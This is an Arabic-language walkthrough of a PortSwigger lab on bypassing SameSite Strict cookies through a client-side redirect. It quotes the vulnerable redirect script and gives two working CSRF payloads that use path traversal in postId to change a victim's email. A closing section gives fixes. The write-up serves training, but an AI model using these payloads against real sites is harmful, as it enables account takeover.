# [SameSite Strict bypass via client-side redirect](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-client-side-redirect)

## **`الهدف`**
إنشاء كود `HTML` يقوم بعمل هجوم `CSRF` بحيث يغير الـ `email` الخاص بالضحية.
## **`خطوات الحل`**
نقوم بتسجيل الدخول إلى حساب `wiener:peter`، ثم بفحص الويب سنلاحظ أن عند وضع أى تعليق في أى تدوينة موجودة يتم نقلك الى صفحة بها رسالة `Thank you for your comment` ويتم عمل إعادة توجيه لصفحة التدوينة.

وعند فحص الـ `HTTP history` في `Burp` سنجد ملف `/resources/js/commentConfirmationRedirect.js`
```JS
redirectOnConfirmation = (blogPath) => {
    setTimeout(() => {
        const url = new URL(window.location);
        const postId = url.searchParams.get("postId");
        window.location = blogPath + '/' + postId;
    }, 3000);
}
```

ومن هذ الملف سنعرف أنه يقوم بإعادة التوجيه بناءً على الـ `PostID` لذلك نستطيع خداعه ليقوم بعمل إعادة توجيه وتغيير البريد الإلكتروني كذلك.

لذلك سنقوم بالدخول إلى السيرفر الخاص بنا الذي يوفره اللاب ونقوم بوضع إحدي السكريبتات التالية في خانة `Body`.

```HTML
<form method="GET" action="https://0ac000b90390121080c5215e0037002e.web-security-academy.net/post/comment/confirmation">
    <input type="hidden" name="postId" value="5/../../my-account/change-email?email=test.est@king.com&submit=1">
</form>

<script>
    document.forms[0].submit();
</script>
```

```html
<script>
    document.location = "https://0ac000b90390121080c5215e0037002e.web-security-academy.net/post/comment/confirmation?postId=5/../../my-account/change-email?email=test.est%40king.com%26submit=1";
</script>
```

بعد ذلك نقوم بالضغط على `Store` ثم `Deliver exploit to victim` لننتهي من حل اللاب.
## **`ترقيع الثغرة`**
**`نفس ترقيع لاب` [CSRF vulnerability with no defenses](./CSRF-vulnerability-with-no-defenses.md)

ويجب برمجة الـ `postId` لكي يقبل أرقام فقط `Integer` إذا كان الموقع يستعمل أرقام عادية للـ `postId` أو يقبل أرقام و `-` فقط إذا كان الموقع يستعمل نظام `UUID`، وأن يرفض وجود الـ `/`.

ويجب تعريف مسار `/change-email` وأى مسارات أخرى حساسة، في الكود على أنه يقبل `POST` فقط بشكل صارم بما أنه مخصص لاستقبال بيانات حساسة، بحيث لو جاء طلب `GET` يقوم السيرفر برفضه بحالة `405 Method Not Allowed` حتى لو كان عن طريق `Redirect`.
